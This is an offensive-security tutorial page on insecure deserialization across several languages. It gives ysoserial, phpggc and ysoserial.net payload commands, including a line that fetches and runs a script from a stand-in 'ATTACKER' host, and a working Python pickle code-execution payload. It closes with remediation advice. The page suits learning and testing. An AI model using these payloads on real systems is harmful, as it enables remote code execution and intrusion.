---
tags:
  - Web
---

# :material-package-variant-closed: Insecure Deserialization

<span class="pill pill-hard">gadget chains</span> <span class="pill pill-info">web</span>

When an app deserializes attacker-controlled data into objects, an attacker who understands the language's object model can often trigger **arbitrary code execution** via *gadget chains* — existing classes whose side effects are abused during deserialization.

!!! abstract "TL;DR"
    Spot serialized blobs (base64 that decodes to structured data), identify the language/format, then use a gadget-chain tool (`ysoserial`, `ysoserial.net`, phpggc) to produce a payload that runs commands.

## :material-magnify: Recognizing serialized data

| Language / format | Telltale signs |
| --- | --- |
| **Java** | Base64 starting `rO0AB...`; raw bytes `AC ED 00 05` |
| **PHP** | `O:4:"User":2:{s:4:"name";s:3:"bob";...}` |
| **Python pickle** | Base64 with `\x80\x04` header; `c__builtin__` |
| **.NET** | `AAEAAAD/////`; `TypeObject`, BinaryFormatter |
| **Ruby** | Marshal `\x04\x08`; YAML with `!ruby/object` |
| **Node** | `_$$ND_FUNC$$_`, serialized functions |

Look in cookies, hidden fields, `viewstate`, API bodies, and caches.

## :material-language-java: Java

The canonical target. If `readObject()` runs on your input and a vulnerable library is on the classpath:

```bash
# Generate a payload with ysoserial (pick a gadget matching the libs present)
java -jar ysoserial.jar CommonsCollections6 'curl http://ATTACKER/x|bash' | base64

# Common gadgets: CommonsCollections1-7, Spring1/2, Groovy1, Hibernate1, ...
```

!!! tip "Which gadget?"
    You need a gadget whose library is actually loaded. Enumerate dependencies (error messages, `/WEB-INF/lib`, jar names). When unsure, spray common ones or use a URLDNS gadget first to *confirm* deserialization happens:
    ```bash
    java -jar ysoserial.jar URLDNS "http://YOURID.oast.pro" | base64
    ```

## :material-language-php: PHP

PHP calls magic methods (`__wakeup`, `__destruct`, `__toString`) during/after `unserialize()`. Chain them:

```bash
# phpggc builds chains for Laravel, Symfony, Monolog, WordPress, etc.
phpggc -l                                  # list available chains
phpggc Monolog/RCE1 system id -b           # base64 payload
phpggc Laravel/RCE9 system 'id'
```

Object-injection example (manual):
```php
O:8:"Example":1:{s:8:"filename";s:11:"/etc/passwd";}
```

## :material-language-python: Python pickle

`pickle.loads()` on untrusted input is instant RCE via `__reduce__`:

```python
import pickle, base64, os
class E:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(E())).decode())
```

!!! opsec "This is a full command-exec primitive"
    Pickle/`yaml.load`/`Marshal.load` deserialization is essentially "run my code on your server." Treat it with the same care as any RCE — grab a stable shell and move to [privesc](../privesc/index.md).

## :material-dot-net: .NET & others

```bash
# ysoserial.net for BinaryFormatter / Json.NET / ViewState etc.
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe"
# ViewState (no MAC / known machineKey):
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd" \
  --generator=<__VIEWSTATEGENERATOR> --validationkey=<KEY> --validationalg=SHA1
```

Ruby: YAML `!ruby/object` payloads; Node: `node-serialize` `_$$ND_FUNC$$_` immediately-invoked functions.

## :material-shield-check: Remediation

- Don't deserialize untrusted data. If you must, use **data-only formats** (JSON) with strict schemas.
- Use allowlists of permitted classes / `ObjectInputFilter` (Java), `pickle` → avoid entirely.
- Sign & verify serialized blobs (ViewState MAC, HMAC on cookies).
- Keep gadget-bearing libraries patched and minimal.

## :material-link-variant: Related

- Another road to RCE alongside [File Upload](file-upload.md) and [SQLi](sqli.md).
- Post-exploitation → [Linux](../privesc/linux.md) / [Windows Privesc](../privesc/windows.md).
- Reference: [OWASP Deserialization](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data).
